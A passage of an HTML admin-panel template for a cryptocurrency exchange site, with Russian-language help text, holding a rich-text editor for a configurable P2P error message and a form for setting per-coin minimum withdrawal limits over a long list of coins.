				                                height: 180,
				                                toolbar: [
				                                  ['style', ['style']],
				                                  ['font', ['bold', 'underline', 'clear']],
				                                  ['color', ['color']],
				                                  ['para', ['ul', 'ol', 'paragraph']],
				                                  ['table', ['table']],
				                                  ['insert', ['link', 'picture', 'video']],
				                                  ['view', ['fullscreen', 'codeview', 'help']]
				                                ]
				                              });
				                          </script>
										</div>
									</div>
									<!--end::editor body-->

									<!--begin::editor body-->
									<div class="flex-row-fluid w-400px">
										<div class="row mt-10">
											<div>
												<span class="d-inline-block position-relative mb-3">
													<!--begin::Label-->
													<span class="fs-3 fw-bold m-0 mb-1">
														P2P error
													</span>
													<!--end::Label-->

													<!--begin::Line-->
													<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-info translate rounded"></span>
													<!--end::Line-->
												</span>
												<div class="text-gray-600 mb-5">Ошибка, которая отобразится при попытке юзером открыть сделку/воспользоваться поиском на странице P2P</div>
											</div>
										</div>

										<div>
											<textarea data-provider="summernote" name="post_body" id="SettingsDefaultP2PErrorMessage">{p2p_error}</textarea>
				                           
											<script>
				                              $('#SettingsDefaultP2PErrorMessage').summernote({
				                                placeholder: 'P2P Error..',
				                                tabsize: 5,
				                                height: 180,
				                                toolbar: [
				                                  ['style', ['style']],
				                                  ['font', ['bold', 'underline', 'clear']],
				                                  ['color', ['color']],
				                                  ['para', ['ul', 'ol', 'paragraph']],
				                                  ['table', ['table']],
				                                  ['insert', ['link', 'picture', 'video']],
				                                  ['view', ['fullscreen', 'codeview', 'help']]
				                                ]
				                              });
				                          </script>
										</div>
									</div>
									<!--end::editor body-->
								</div>
							</div>
							<!--end::Card body-->
							<!--begin::Actions-->
							<div class="card-footer d-flex justify-content-end py-6 px-9">
								<span id="saveAllDefaultErrorMessage" class="btn btn-primary">Save changes</span>
							</div>
							<!--end::Actions-->
						</form>
						<!--end::Form-->
					</div>
					<!--end::Content-->
				</div>
				<!--end::Basic info-->

				<!--begin::Min amount-->
				<!--begin::Basic info-->
				<div class="card mb-5 mb-xl-20">
					<!--begin::Card header-->
					<div class="card-header border-0">
						<!--begin::Card title-->
						<div class="card-title m-0">
							<h3 class="fw-bold m-0">Limits settings</h3>
						</div>
						<!--end::Card title-->
					</div>
					<!--begin::Card header-->
					<!--begin::Content-->
					<div id="id_15" class="collapse show">
						<!--begin::Form-->
						<form id="id_25" class="form">
							<!--begin::Card body-->
							<div class="card-body border-top p-9">
								<!--begin::Input group-->
								<div class="row mb-10">
									<div>
										<span class="d-inline-block position-relative">
											<!--begin::Label-->
											<span class="fs-3 fw-bold m-0 mb-1">
												Withdrawal minimal limit
											</span>
											<!--end::Label-->

											<!--begin::Line-->
											<span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-primary translate rounded"></span>
											<!--end::Line-->
										</span>
										<div class="text-gray-600 mt-5">Вы можете добавить свои минимальные суммы для вывода вашими юзерами для каждой из монет.</div>
									</div>
									<div class="input-group flex-nowrap mt-5 mb-5">
										<span class="input-group-text">Select coin:</span>
										<div class="overflow-hidden flex-grow-1">
											<!--begin::Select-->
											<select id="spMinDepCurrency" name="currnecy" aria-label="Select a Timezone" data-control="select2" data-placeholder="Select currency" class="form-select rounded-start-0">
												
							                      <option value="btc">Bitcoin (BTC) / min.0</option>

							                    
							                      <option value="eth">Ethereum (ETH) / min.0</option>

							                    
							                      <option value="ltc">Litecoin (LTC) / min.0</option>

							                    
							                      <option value="usdttrc">USDT TRC-20 (USDTTRC) / min.0</option>

							                    
							                      <option value="usdt">USDT ERC-20 (USDT) / min.0</option>

							                    
							                      <option value="usdtbep">USDT BEP-20 (USDTBEP) / min.0</option>

							                    
							                      <option value="trx">Tron (TRX) / min.0</option>

							                    
							                      <option value="usdc">USD Coin ERC-20 (USDC) / min.0</option>

							                    
							                      <option value="bnb20">BNB BEP-20 (BNB20) / min.0</option>

							                    
							                      <option value="bnb">BNB BEP-2 (BNB) / min.0</option>

							                    
							                      <option value="bch">Bitcoin Cash (BCH) / min.0</option>

							                    
							                      <option value="doge">Dogecoin (DOGE) / min.0</option>

							                    
							                      <option value="xmr">Monero (XMR) / min.0</option>

							                    
							                      <option value="xlm">Stellar (XLM) / min.0</option>

							                    
							                      <option value="xtz">Tezos (XTZ) / min.0</option>

							                    
							                      <option value="eos">EOS (EOS) / min.0</option>

							                    
							                      <option value="shib">SHIBA INU BEP-20 (SHIB) / min.0</option>

							                    
							                      <option value="link">Chainlink ERC-20 (LINK) / min.0</option>

							                    
							                      <option value="btg">Bitcoin Gold (BTG) / min.0</option>

							                    
							                      <option value="etc">Ethereum Classic (ETC) / min.0</option>

							                    
							                      <option value="xrp">Ripple (XRP) / min.0</option>

							                    
							                      <option value="ada">Cardano (ADA) / min.0</option>

							                    
							                      <option value="dash">Dash (DASH) / min.0</option>

							                    
							                      <option value="zec">Zcash (ZEC) / min.0</option>

							                    
							                      <option value="sol">SOL (SOL) / min.0</option>

							                    
							                      <option value="luna">LUNA (LUNA) / min.0</option>

							                    
							                      <option value="ape">APE (APE) / min.0</option>

							                    
							                      <option value="lunc">LUNC (LUNC) / min.0</option>

							                    
							                      <option value="dot">DOT (DOT) / min.0</option>

							                    
							                      <option value="matic">MATIC (MATIC) / min.0</option>

							                    
							                      <option value="near">NEAR (NEAR) / min.0</option>

							                    
							                      <option value="twt">TWT (TWT) / min.0</option>

							                    
							                      <option value="rvn">RVN (RVN) / min.0</option>

							                    
							                      <option value="woo">WOO (WOO) / min.0</option>

							                    
							                      <option value="paxg">PAXG (PAXG) / min.0</option>

							                    
							                      <option value="alpaca">ALPACA (ALPACA) / min.0</option>

							                    
							                      <option value="gno">GNO (GNO) / min.0</option>

							                    
							                      <option value="gal">GAL (GAL) / min.0</option>

							                    
							                      <option value="astr">ASTR (ASTR) / min.0</option>

							                    
							                      <option value="nexo">NEXO (NEXO) / min.0</option>

							                    
							                      <option value="loka">LOKA (LOKA) / min.0</option>

							                    
							                      <option value="fil">FIL (FIL) / min.0</option>

							                    
							                      <option value="dnt">DNT (DNT) / min.0</option>

							                    
							                      <option value="ocean">OCEAN (OCEAN) / min.0</option>

							                    
							                      <option value="comp">COMP (COMP) / min.0</option>

							                    
							                      <option value="tomo">TOMO (TOMO) / min.0</option>

							                    
							                      <option value="pundix">PUNDIX (PUNDIX) / min.0</option>

							                    
							                      <option value="key">KEY (KEY) / min.0</option>

							                    
							                      <option value="vite">VITE (VITE) / min.0</option>

							                    
							                      <option value="hnt">HNT (HNT) / min.0</option>

							                    
							                      <option value="bat">BAT (BAT) / min.0</option>

							                    
							                      <option value="gala">GALA (GALA) / min.0</option>

							                    
							                      <option value="rad">RAD (RAD) / min.0</option>

							                    
							                      <option value="ankr">ANKR (ANKR) / min.0</option>

							                    
							                      <option value="wing">WING (WING) / min.0</option>

							                    
							                      <option value="bake">BAKE (BAKE) / min.0</option>

							                    
							                      <option value="strax">STRAX (STRAX) / min.0</option>

							                    
							                      <option value="perp">PERP (PERP) / min.0</option>

							                    
							                      <option value="epx">EPX (EPX) / min.0</option>

							                    
							                      <option value="yfi">YFI (YFI) / min.0</option>

							                    
							                      <option value="nmr">NMR (NMR) / min.0</option>

							                    
							                      <option value="pyr">PYR (PYR) / min.0</option>

							                    
							                      <option value="srm">SRM (SRM) / min.0</option>

							                    
							                      <option value="bond">BOND (BOND) / min.0</option>

							                    
							                      <option value="jst">JST (JST) / min.0</option>

							                    
							                      <option value="powr">POWR (POWR) / min.0</option>

							                    
							                      <option value="fida">FIDA (FIDA) / min.0</option>

							                    
							                      <option value="voxel">VOXEL (VOXEL) / min.0</option>

							                    
							                      <option value="mana">MANA (MANA) / min.0</option>

							                    
							                      <option value="rare">RARE (RARE) / min.0</option>

							                    
							                      <option value="adx">ADX (ADX) / min.0</option>

							                    
							                      <option value="ont">ONT (ONT) / min.0</option>

							                    
							                      <option value="sand">SAND (SAND) / min.0</option>

							                    
							                      <option value="cocos">COCOS (COCOS) / min.0</option>

							                    
							                      <option value="alice">ALICE (ALICE) / min.0</option>

							                    
							                      <option value="mtl">MTL (MTL) / min.0</option>

							                    
							                      <option value="flm">FLM (FLM) / min.0</option>

							                    
							                      <option value="mdx">MDX (MDX) / min.0</option>

							                    
							                      <option value="qtum">QTUM (QTUM) / min.0</option>

							                    
							                      <option value="bnt">BNT (BNT) / min.0</option>

							                    
							                      <option value="xvs">XVS (XVS) / min.0</option>

							                    
							                      <option value="bico">BICO (BICO) / min.0</option>

							                    
							                      <option value="uma">UMA (UMA) / min.0</option>

							                    
							                      <option value="loca">LOCA (LOCA) / min.0</option>

							                    
							                      <option value="clv">CLV (CLV) / min.0</option>

							                    
							                      <option value="akro">AKRO (AKRO) / min.0</option>

							                    
							                      <option value="lsk">LSK (LSK) / min.0</option>

							                    
							                      <option value="dock">DOCK (DOCK) / min.0</option>

							                    
							                      <option value="rep">REP (REP) / min.0</option>

							                    
							                      <option value="beam">BEAM (BEAM) / min.0</option>

							                    
							                      <option value="cfx">CFX (CFX) / min.0</option>

							                    
							                      <option value="celo">CELO (CELO) / min.0</option>

							                    
							                      <option value="iotx">IOTX (IOTX) / min.0</option>

							                    
							                      <option value="crv">CRV (CRV) / min.0</option>

							                    
							                      <option value="mith">MITH (MITH) / min.0</option>

							                    
							                      <option value="celr">CELR (CELR) / min.0</option>

							                    
							                      <option value="oxt">OXT (OXT) / min.0</option>

							                    
							                      <option value="fio">FIO (FIO) / min.0</option>

							                    
							                      <option value="scrt">SCRT (SCRT) / min.0</option>

							                    
							                      <option value="audio">AUDIO (AUDIO) / min.0</option>

							                    
							                      <option value="chz">CHZ (CHZ) / min.0</option>

							                    
							                      <option value="busd">BUSD (BUSD) / min.0.005</option>

							                    
							                      <option value="arb">ARB (ARB) / min.0.005</option>

							                    
							                      <option value="mln">MLN (MLN) / min.0.005</option>

							                    
							                      <option value="atm">ATM (ATM) / min.0.005</option>

							                    
							                      <option value="orn">ORN (ORN) / min.0.005</option>

							                    
							                      <option value="bifi">BIFI (BIFI) / min.0.005</option>

							                    
							                      <option value="multi">MULTI (MULTI) / min.0.005</option>

							                    
							                      <option value="ctsi">CTSI (CTSI) / min.0.005</option>

							                    
							                      <option value="farm">FARM (FARM) / min.0.005</option>

							                    
							                      <option value="asr">ASR (ASR) / min.0.005</option>

							                    
							                      <option value="trb">TRB (TRB) / min.0.005</option>

							                    
							                      <option value="wbtc">WBTC (WBTC) / min.0.005</option>

							                    
							                      <option value="ghst">GHST (GHST) / min.0.005</option>

							                    
							                      <option value="for">FOR (FOR) / min.0.005</option>

							                    
							                      <option value="xno">XNO (XNO) / min.0.005</option>

							                    
							                      <option value="ong">ONG (ONG) / min.0.005</option>

							                    
							                      <option value="ark">ARK (ARK) / min.0.005</option>

							                    
							                      <option value="wan">WAN (WAN) / min.0.005</option>

							                    
							                      <option value="bts">BTS (BTS) / min.0.005</option>

							                    
							                      <option value="fun">FUN (FUN) / min.0.005</option>

							                    
							                      <option value="snt">SNT (SNT) / min.0.005</option>

							                    
							                      <option value="dia">DIA (DIA) / min.0.005</option>

							                    
							                      <option value="alcx">ALCX (ALCX) / min.0.005</option>

							                    
							                      <option value="hard">HARD (HARD) / min.0.005</option>

							                    
							                      <option value="glm">GLM (GLM) / min.0.005</option>

							                    
							                      <option value="exp">EXP (EXP) / min.0.005</option>

							                    
							                      <option value="cream">CREAM (CREAM) / min.0.005</option>

							                    
							                      <option value="qcc">QCC (QCC) / min.0.005</option>

							                    
							                      <option value="wnxm">WNXM (WNXM) / min.0.005</option>

							                    
							                      <option value="troy">TROY (TROY) / min.0.005</option>

							                    
							                      <option value="stpt">STPT (STPT) / min.0.005</option>

							                    
							                      <option value="firo">FIRO (FIRO) / min.0.005</option>

							                    
							                      <option value="front">FRONT (FRONT) / min.0.005</option>

							                    
							                      <option value="wrx">WRX (WRX) / min.0.005</option>

							                    
							                      <option value="dcr">DCR (DCR) / min.0.005</option>

							                    
							                      <option value="cos">COS (COS) / min.0.005</option>

							                    
							                      <option value="mbl">MBL (MBL) / min.0.005</option>

							                    
							                      <option value="sun">SUN (SUN) / min.0.005</option>

							                    
							                      <option value="xvg">XVG (XVG) / min.0.005</option>

							                    											</select>
											<!--end::Select-->
										</div>
									</div>
									<div class="input-group mb-5">
										<span class="input-group-text">Amount:</span>
										<input id="spMinDepAmount" type="number" class="form-control" placeholder="0" />
									</div>

									<div class="text-gray-600">По умолчанию, минимальных сумм для вывода нет.</div>

									<div class="d-flex mt-5 justify-content-end"><span id="spAddMinDepAmount" class="btn btn-primary">Add</span></div>
								</div>

								<div>
									<div class="table-responsive">
										<table class="table table-rounded table-row-bordered border gy-7 gs-7">
											<thead>
												<tr class="fw-semibold fs-6 text-gray-800 border-bottom border-gray-200">
													<th>Coin</th>
													<th>Min. limit</th>
													<th>Action</th>
												</tr>
											</thead>
											<tbody>

												
											</tbody>
										</table>
									</div>
								</div>
								<!--end::Input group-->
							</div>
							<!--end::Card body-->
							<!--begin::Actions-->

							<!--end::Actions-->
						</form>
						<!--end::Form-->
					</div>
					<!--end::Content-->
				</div>
				<!--end::Basic info-->

			</div>
		</div>
		<!--end::Content container-->
	</div>